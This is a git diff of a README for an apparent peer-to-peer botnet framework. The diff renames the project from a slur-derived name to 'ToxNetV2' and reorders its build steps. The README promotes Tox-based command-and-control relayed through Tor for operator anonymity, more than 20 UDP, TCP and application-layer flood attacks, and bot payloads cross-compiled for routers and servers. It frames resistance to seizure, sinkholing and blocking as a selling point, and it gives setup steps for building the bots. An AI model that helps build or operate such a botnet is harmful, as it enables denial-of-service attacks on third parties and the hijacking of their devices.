@@ -1,4 +1,4 @@
-# GoyBeam P2P Botnet Framework
+# ToxNetV2 P2P Botnet Framework
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Go Version](https://img.shields.io/badge/go-1.21-blue.svg)](https://golang.org/)
 [![Tox Protocol](https://img.shields.io/badge/Tox-C2-green.svg)](https://tox.chat/)
@@ -11,7 +11,7 @@
 
 ---
 ## 🎯 Overview
-**GoyBeam** (Toxnet) is a modern, decentralized Command and Control (C2) framework built on the Tox encrypted messaging protocol. Unlike traditional HTTP-based C2 infrastructure that relies on central servers vulnerable to seizure and monitoring, GoyBeam operates on a peer-to-peer network where every node acts as both a potential relay and endpoint.
+**Toxnet** is a modern, decentralized Command and Control (C2) framework built on the Tox encrypted messaging protocol. Unlike traditional HTTP-based C2 infrastructure that relies on central servers vulnerable to seizure and monitoring, ToxNetV2 operates on a peer-to-peer network where every node acts as both a potential relay and endpoint.
 
 The C2 server acts as a relay between the operator and the botnet. Operators connect to the C2 using any standard Tox client, sending commands as encrypted messages. The C2 validates the operator's public key, then forwards commands to the botnet and relays responses back. All C2 traffic routes through Tor for complete operator anonymity.
 
@@ -188,7 +188,7 @@ All attack commands follow a consistent pattern:
 
 ---
 ## 🧅 Tor Anonymity
-GoyBeam includes comprehensive Tor integration for complete operator anonymity:
+ToxNetV2 includes comprehensive Tor integration for complete operator anonymity:
 
 **Features:**
 - **Transparent Proxy**: All C2 traffic routed through Tor automatically
@@ -275,10 +275,10 @@ toxnetV2/
 ---
 ## ⭐ Project Highlights
 
-### What Makes GoyBeam Special?
+### What Makes ToxNetV2 Special?
 
 **1. True Decentralization**  
-Unlike traditional C2 that relies on central servers, GoyBeam uses the Tox DHT network. There is no central server to seize, no domain to sinkhole, no IP to block. The network heals itself as nodes come and go.
+Unlike traditional C2 that relies on central servers, ToxNetV2 uses the Tox DHT network. There is no central server to seize, no domain to sinkhole, no IP to block. The network heals itself as nodes come and go.
 
 **2. Operator Anonymity**  
 Operators never communicate directly with bots. All commands pass through the C2 relay, which routes all traffic through Tor. The operator's identity is protected at every layer.
@@ -287,7 +287,7 @@ Operators never communicate directly with bots. All commands pass through the C2
 The C2 acts as a pure relay between the operator and the botnet. Operators connect using standard Tox clients, sending commands as friend messages. The C2 validates admin keys, forwards commands, and aggregates responses.
 
 **4. Multi-Architecture Excellence**  
-From x86_64 servers to MIPS-based routers, GoyBeam can run on virtually any Linux device. The cross-compilation system generates payloads for over ten architectures from a single build environment.
+From x86_64 servers to MIPS-based routers, ToxNetV2 can run on virtually any Linux device. The cross-compilation system generates payloads for over ten architectures from a single build environment.
 
 **5. Comprehensive Attack Suite**  
 Over 20 distinct attack methods covering UDP floods, TCP floods, and application-layer attacks. Each method targets specific protocol vulnerabilities and evasion techniques.
@@ -314,7 +314,7 @@ Demonstrates modern C2 techniques, peer-to-peer networking, malware engineering,
 ## 📦 Installation & Setup
 
 ### Prerequisites
-Before building GoyBeam, you need to install the following dependencies:
+Before building ToxNetV2, you need to install the following dependencies:
 
 #### For Ubuntu/Debian:
 ```bash
@@ -331,6 +331,7 @@ sudo apt install -y build-essential git curl wget
 sudo apt install -y libsodium-dev libsodium23 libtool autoconf automake cmake pkg-config
 
 # Install cross-compilation toolchains
+./Xcompiletools.sh for a simple all in one crosscompiler install or manually.
 sudo apt install -y gcc-aarch64-linux-gnu gcc-arm-linux-gnueabi gcc-arm-linux-gnueabihf \
                     gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64 \
                     gcc-powerpc64le-linux-gnu gcc-s390x-linux-gnu gcc-i686-linux-gnu
@@ -342,26 +343,21 @@ sudo apt install -y tor
 #### For Other Linux Distributions:
 Adjust package manager commands accordingly (yum, dnf, pacman, etc.).
 
-### Building GoyBeam
+### Building ToxNetV2
 
 1. **Clone and enter the repository:**
    ```bash
    git clone <repository-url>
    cd toxnetV2
    ```
-
-2. **Build the C2 server:**
+2. **Edit Tox ID in net/config.go :**
    ```bash
-   go build -o toxnet-c2 main.go
+     var Admins = []string{"YOUR QTOX ID HERE"}
    ```
 
-3. **Generate bot payloads:**
+3. **Build the C2 server:**
    ```bash
-   # Generate Linux payload stub
-   ./toxnet-c2 -t linux -o bot_stub
-   
-   # Build cross-platform bots
-   ./build.sh
+   go build -o toxnet-c2 main.go
    ```
 
 4. **Set up cross-compilation libraries:**
@@ -373,6 +369,15 @@ Adjust package manager commands accordingly (yum, dnf, pacman, etc.).
    ./build_mips_libs.sh
    ```
 
+
+5. **Generate bot payloads:**
+   ```bash
+   # Generate Linux payload stub
+   ./toxnet-c2 -t linux -o bot_stub
+   
+   # Build cross-platform bots
+   ./build.sh
+   ```
 ### Running with Tor Anonymity
 For maximum operational security, run the C2 through Tor:
 
